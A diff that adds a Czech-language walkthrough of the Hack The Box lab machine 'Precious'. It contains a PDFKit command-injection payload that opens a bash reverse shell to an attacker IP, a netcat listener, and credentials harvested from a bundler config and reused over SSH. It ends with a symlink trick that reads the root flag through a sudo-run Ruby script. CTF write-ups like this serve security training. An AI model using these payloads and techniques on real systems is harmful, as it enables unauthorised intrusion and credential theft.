@@ -1,0 +1,74 @@
+1. nmap -sC -sV 10.129.45.198
+
+    - 22/tcp open ssh (OpenSSH 8.4p1 Debian 5+deb11u1)
+        - ssh-hostkey = RSA/ECDSA/ED25519
+    - 80/tcp open http (nginx/1.18.0)
+        - http-title: Did not follow redirect to http://precious.htb/
+        
+   // lze se pripojit vzdalene pomoci SSH
+   // je to webova aplikace, kterou lze pomoci HTTP zobrazit v prohlizeci
+   // Zadanim IP se nezobrazi -> je treba v /etc/hosts nakonfigurovat redirect (DNS)
+   
+   
+2. sudo nano /etc/hosts -> 10.129.45.198   precious.htb
+
+    - pridani adresy hosta  
+    
+    
+3. Analyza webove aplikace
+
+    - zadani URL adresy nejakeho webu, submitnutim se konvertuje do PDF
+    
+    
+4. Nalezeni command injection in pdf
+
+    - https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
+    - upraveni pro nase uplatneni
+        - http://localhost/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.131/8000 0>&1"`'}
+            - https://www.revshells.com/
+                - nc -lvnp 8000
+                - sh -i >& /dev/tcp/10.10.14.131/8000 0>&1
+                    - IP adresa VPN spojeni s HTB, ne IP adresa machine, na kterou utocime
+                    - port 8000     
+    
+5. nc -lvnp 8000
+    - posloucha vse na portu 8000
+    
+
+6. Spusteni Burpsuite+FoxyProxy
+
+
+7. http://localhost/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.131/8000 0>&1"`'}
+    - Na webu precious.htb zadame command injekci
+    - v terminalu pod nc -lvnp 8000 vidime, ze jsme pripojeni na webserver
+    
+    
+8. Vyhledavani v shellu: ruby@precious:/var/www/pdfapp$
+    - ls
+    - cd ~/.bundle
+    - ls
+    - cat config
+        - BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
+            - udaje pro SSH pripojeni do cilove IP adresy
+                - UN: henry
+                - PW: Q3c1AqGHtoI0aXAYFH
+                
+                
+9. SSH pripojeni do cilove IP adresy
+    - ssh henry@10.129.45.198       //IP adresa vygenerovane IP cilove machine
+        - PW: Q3c1AqGHtoI0aXAYFH
+    - ls
+    - cat user.txt
+        - USER FLAG: "XXXXX"
+        
+
+10. Ziskani root flagu
+    - ln -s /root/root.txt dependencies.yml
+    - sudo /usr/bin/ruby /opt/update_dependencies.rb
+        - Sice dostaneme error, ale ten nam take staci :-)
+            - Traceback (most recent call last): /opt/update_dependencies.rb:20:in `<main>': undefined method `each' for "XXXXX":String (NoMethodError)
+    - ROOT FLAG: "XXXXX"
+
+  
+    
+    
